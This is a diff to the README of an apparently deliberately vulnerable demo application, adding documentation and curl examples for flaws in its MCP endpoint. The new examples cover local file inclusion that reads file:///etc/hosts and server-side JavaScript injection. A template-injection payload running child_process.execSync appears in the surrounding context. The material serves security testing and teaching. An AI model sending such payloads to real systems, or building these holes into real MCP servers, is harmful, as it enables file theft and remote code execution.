@@ -1227,11 +1227,13 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
   </details>
 
-- **MCP (Model Context Protocol) Vulnerabilities** - The application exposes an MCP HTTP endpoint at `/api/mcp` that implements the JSON-RPC 2.0 protocol for AI agent tool calling. This endpoint contains multiple vulnerabilities through its exposed tools:
+- **MCP (Model Context Protocol) Vulnerabilities** - The application exposes an MCP HTTP endpoint at `/api/mcp` that implements the JSON-RPC 2.0 protocol for AI agent tool calling. This endpoint contains multiple vulnerabilities through its exposed tools and resources:
 
   - **SQL Injection via count_tool** - The `count_tool` accepts a SQL query parameter and executes it directly against the database without sanitization, similar to the `/api/testimonials/count` endpoint.
   - **Sensitive Data Exposure via config_tool** - The `config_tool` returns application configuration including database credentials, API keys, and cloud storage URLs.
   - **Server-Side Template Injection via render_tool** - The `render_tool` accepts a custom template string that is compiled and executed using the doT template engine, allowing arbitrary code execution.
+  - **Local File Inclusion via MCP resources/read** - The `resources/read` method accepts `file://` URIs and proxies `/api/file/raw`, allowing arbitrary file reads such as `file:///etc/hosts`.
+  - **Server-Side JavaScript Injection via process_numbers_tool** - The `process_numbers_tool` proxies `/api/process_numbers` and executes arbitrary JavaScript from the `processing_expression` expression in server context.
   - **Authentication and Session Management** - The `/api/mcp` endpoint supports optional authentication and per-client session tracking:
 
     - MCP sessions are independent from the regular API authentication/authorization flow.
@@ -1248,8 +1250,10 @@ Full configuration & usage examples can be found in our [demo project](https://g
     - MCP permissions are role-based using the same user model as the HTTP server (`admin` vs regular user).
     - Some tools require authenticated MCP sessions, while others are available without authentication.
     - `config_tool` is admin-only.
+    - `render_tool` responds as `text/event-stream`:
+      `event: message` + `data: <json-rpc-payload>`.
 
-  - **MCP Tool List (Quick Reference)**:
+  - **MCP Tool/Resource List (Quick Reference)**:
 
     _Initialize guest MCP session (required for all non-`initialize` MCP calls):_
 
@@ -1304,7 +1308,56 @@ Full configuration & usage examples can be found in our [demo project](https://g
          }'
        ```
 
-    3. `config_tool` (admin only)  
+    3. `resources/list` + `resources/read` (public)  
+       Vulnerability: **Local File Inclusion (LFI)** via `file://` URI read from `/api/file/raw`.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "resources/list",
+           "id": 4
+         }'
+
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "resources/read",
+           "params": {
+             "uri": "file:///etc/hosts"
+           },
+           "id": 5
+         }'
+       ```
+
+    4. `process_numbers_tool` (public)  
+       Vulnerability: **Server-Side JavaScript Injection (SSJI)** via dynamic code execution.  
+       Example:
+
+       ```bash
+       curl "${BASE}/api/mcp" -X POST \
+         -H 'Content-Type: application/json' \
+         -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+         -d '{
+           "jsonrpc": "2.0",
+           "method": "tools/call",
+           "params": {
+            "name": "process_numbers_tool",
+            "arguments": {
+              "numbers": [1, 2, 3],
+              "processing_expression": "numbers.reduce((acc, num) => acc + num, 0)"
+            }
+          },
+          "id": 6
+         }'
+       ```
+
+    5. `config_tool` (admin only)  
        Vulnerability: **Sensitive Data Exposure** (returns app configuration including secrets when allowed).  
        Example (admin-authenticated MCP session):
 
@@ -1341,7 +1394,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
 
   _Note: Always call `initialize` first. After that, send `Mcp-Session-Id` on every MCP request. Authenticated and unauthenticated sessions are both supported._
 
-  1. **Initialize MCP session and list tools**:
+  1. **Initialize MCP session and list tools/resources**:
 
   ```bash
   BASE='https://brokencrystals.com'
@@ -1354,6 +1407,11 @@ Full configuration & usage examples can be found in our [demo project](https://g
     -H 'Content-Type: application/json' \
     -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
     -d '{"jsonrpc":"2.0","method":"tools/list","id":2}'
+
+  curl "${BASE}/api/mcp" -X POST \
+    -H 'Content-Type: application/json' \
+    -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+    -d '{"jsonrpc":"2.0","method":"resources/list","id":3}'
   ```
 
   2. **SQL Injection via count_tool**:
@@ -1432,7 +1490,47 @@ Full configuration & usage examples can be found in our [demo project](https://g
      }
      ```
 
-  4. **Server-Side Template Injection via render_tool**:
+  4. **Local File Inclusion via resources/read**:
+
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "resources/read",
+         "params": {
+           "uri": "file:///etc/hosts"
+         },
+         "id": 5
+       }'
+     ```
+
+     This payload reads local server files through the `/api/file/raw` proxy using a `file://` URI.
+
+  5. **Server-Side JavaScript Injection via process_numbers_tool**:
+
+     ```bash
+     curl "${BASE}/api/mcp" -X POST \
+       -H 'Content-Type: application/json' \
+       -H "Mcp-Session-Id: ${MCP_SESSION_ID}" \
+       -d '{
+         "jsonrpc": "2.0",
+         "method": "tools/call",
+         "params": {
+           "name": "process_numbers_tool",
+           "arguments": {
+             "numbers": [1, 2, 3],
+             "processing_expression": "numbers.reduce((acc, num) => acc + num, 0)"
+           }
+         },
+         "id": 6
+       }'
+     ```
+
+     This payload executes JavaScript directly on the server.
+
+  6. **Server-Side Template Injection via render_tool**:
 
      ```bash
      curl "${BASE}/api/mcp" -X POST \
@@ -1448,7 +1546,7 @@ Full configuration & usage examples can be found in our [demo project](https://g
              "template": "{{= global.process.mainModule.require('\''child_process'\'').execSync('\''ls -la'\'') }}"
            }
          },
-         "id": 5
+         "id": 8
        }'
      ```
 
